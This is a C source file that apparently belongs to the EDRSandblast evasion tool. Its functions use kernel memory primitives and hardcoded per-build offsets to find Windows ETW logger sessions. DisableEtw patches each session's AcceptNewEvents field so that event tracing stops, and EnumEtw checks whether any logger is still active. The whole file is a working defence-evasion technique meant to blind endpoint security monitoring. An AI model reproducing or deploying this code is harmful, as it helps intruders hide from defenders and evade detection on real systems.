#include "../EDRSandblast.h"
#include "IsEDRChecks.h"
#include "PdbSymbols.h"
#include "FltmgrOffsets.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "FileVersion.h"
#include "KernelCallbacks.h"

#include "MinifilterCallbacks.h"

#include "./memory.h"
#include "./symbol.h"
#include "./kernel.h"

typedef struct _OFFSET_CONTEXT {
  OS_KEY os;
  UINT16 offset;
} OFFSET_CONTEXT, *POFFSET_CONTEXT;

OFFSET_CONTEXT contextOffsetPool[] = {
  {OS_10_10586, 0x390},
  {OS_10_15063, 0x398},
  {OS_10_16299, 0x1a8},
  {OS_10_17134, 0x1b0},
  {OS_10_18362, 0x1c8}
};

#define OFFSET_AcceptNewEvents 0x10
#define COUNT_SESSIONS 0x40
#define NO_AcceptNewEvents 0x80000000
void DisableEtw() {
  POFFSET_CONTEXT pOffset = (POFFSET_CONTEXT)FindVersionedStruct((PBYTE)contextOffsetPool, _countof(contextOffsetPool), sizeof(OFFSET_CONTEXT));

  DWORD64 sessionsList = 0;
  if (BuildIDKey == OS_10_10240) {
    sessionsList = ReadMemoryDWORD64(KernelSymbolAddresses[SYM_KNL_WmipLoggerContext]);
  } else {
    INT8 ix;
    if (BuildIDKey == OS_10_10586) {
      ix = SYM_KNL_EtwpSiloState;
    } else {
      ix = SYM_KNL_EtwpHostSiloState;
    }
    DWORD64 state = ReadMemoryDWORD64(KernelSymbolAddresses[ix]);
    sessionsList = ReadMemoryDWORD64(state + pOffset->offset);
  }

  for (UINT8 i = 2; i < COUNT_SESSIONS; i++) { // The first two slots are reserved/unused
    DWORD64 itemAddr = sessionsList + sizeof(PVOID) * i;
    DWORD64 _WMI_LOGGER_CONTEXT = ReadMemoryDWORD64(itemAddr);
    if (_WMI_LOGGER_CONTEXT == 1) {
      continue;
    }
    DWORD64 addr_AcceptNewEvents = _WMI_LOGGER_CONTEXT + OFFSET_AcceptNewEvents;
    DWORD AcceptNewEvents = ReadMemoryDWORD(addr_AcceptNewEvents);
    printf("Logger ID %x AcceptNewEvents [%u]\n", i, AcceptNewEvents);
    if (AcceptNewEvents != NO_AcceptNewEvents) {
      PatchExplicit(addr_AcceptNewEvents, (Value){ .dword = NO_AcceptNewEvents }, (Value){ .dword = AcceptNewEvents }, S4, itemAddr, _WMI_LOGGER_CONTEXT);
      printf("  >>> Disabled\n");
    }
  }
}

BOOL EnumEtw() {
  POFFSET_CONTEXT pOffset = (POFFSET_CONTEXT)FindVersionedStruct((PBYTE)contextOffsetPool, _countof(contextOffsetPool), sizeof(OFFSET_CONTEXT));

  DWORD64 sessionsList = 0;
  if (BuildIDKey == OS_10_10240) {
    sessionsList = ReadMemoryDWORD64(KernelSymbolAddresses[SYM_KNL_WmipLoggerContext]);
  } else {
    INT8 ix;
    if (BuildIDKey == OS_10_10586) {
      ix = SYM_KNL_EtwpSiloState;
    } else {
      ix = SYM_KNL_EtwpHostSiloState;
    }
    DWORD64 state = ReadMemoryDWORD64(KernelSymbolAddresses[ix]);
    sessionsList = ReadMemoryDWORD64(state + pOffset->offset);
  }

  for (UINT8 i = 2; i < COUNT_SESSIONS; i++) { // The first two slots are reserved/unused
    DWORD64 itemAddr = sessionsList + sizeof(PVOID) * i;
    DWORD64 _WMI_LOGGER_CONTEXT = ReadMemoryDWORD64(itemAddr);
    if (_WMI_LOGGER_CONTEXT == 1) {
      continue;
    }
    DWORD64 addr_AcceptNewEvents = _WMI_LOGGER_CONTEXT + OFFSET_AcceptNewEvents;
    DWORD AcceptNewEvents = ReadMemoryDWORD(addr_AcceptNewEvents);
    printf("Logger ID %x AcceptNewEvents [%x]\n", i, AcceptNewEvents);
    if (AcceptNewEvents != NO_AcceptNewEvents) {
      return TRUE;
    }
  }
  return FALSE;
}

